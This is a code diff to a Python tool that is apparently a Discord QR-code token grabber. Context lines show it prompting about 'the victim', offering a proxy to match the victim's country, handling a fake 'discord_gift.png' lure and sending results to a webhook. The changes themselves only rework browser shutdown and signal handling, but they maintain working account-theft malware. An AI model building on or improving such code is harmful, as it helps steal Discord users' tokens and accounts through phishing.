@@ -30,14 +30,16 @@ from constants import BANNER, PYSTRAY_IMG
 from discord_token import QRGrabber, TokenInfo
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
 from queue import Queue
-from signal import SIGTERM
+import signal
+import atexit
 from cairosvg import svg2png
+
 
 
 def main(webhook_url: str) -> None:
     proxy_value = Write.Input("\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ", Colors.green_to_cyan, interval=0.01)
     opts = webdriver.ChromeOptions()
-    opts.add_argument('--headless')
+    #opts.add_argument('--headless')
     opts.add_argument('--silent')
     opts.add_argument('start-maximized')
     opts.add_argument('--disable-gpu')
@@ -90,7 +92,7 @@ def main(webhook_url: str) -> None:
         qr_code = qrg.get_qr_from_source(main.driver)
     except QRCodeNotFound as e:
         try:
-            main.driver.service.process.send_signal(SIGTERM)
+            main.driver.quit()
         except:
             pass
         raise SystemExit(Write.Print(f'\n\n[^] QrCodeException occured ! The script returned :\n\n{e}', Colors.yellow_to_green))
@@ -140,7 +142,7 @@ def main(webhook_url: str) -> None:
                     break
             else:
                 break
-        main.driver.service.process.send_signal(SIGTERM)
+        main.driver.quit()
     q, e = Queue(), Event()
     thread_timer_killer = Thread(target=timer_killer, args=(q, e, ))
     thread_timer_killer.start()
@@ -149,8 +151,7 @@ def main(webhook_url: str) -> None:
         e.set()
         while thread_timer_killer.is_alive():
             continue
-        main.driver.service.process.send_signal(SIGTERM)
-
+        main.driver.quit()
         try:
             os.remove('discord_gift.png')
         except BaseException:
@@ -176,6 +177,18 @@ def main(webhook_url: str) -> None:
 
 
 if __name__ == "__main__":
+    def handle_exit():
+        try:
+            main.driver.quit()
+        except:
+            pass
+        try:
+            pystray_icon.icon.stop()
+        except:
+            pass
+    atexit.register(handle_exit)
+    signal.signal(signal.SIGTERM, handle_exit)
+    signal.signal(signal.SIGINT, handle_exit)
     def pystray_icon():
         def window_state(_, item):
             if str(item) == 'Show':
@@ -187,8 +200,9 @@ if __name__ == "__main__":
             elif str(item) == 'Quit':
                 pystray_icon.icon.stop()
                 try:
-                    main.driver.service.process.send_signal(SIGTERM)
+                    main.driver.quit()
                 except:
+                    pass
                     pass
                 os._exit(0)
 
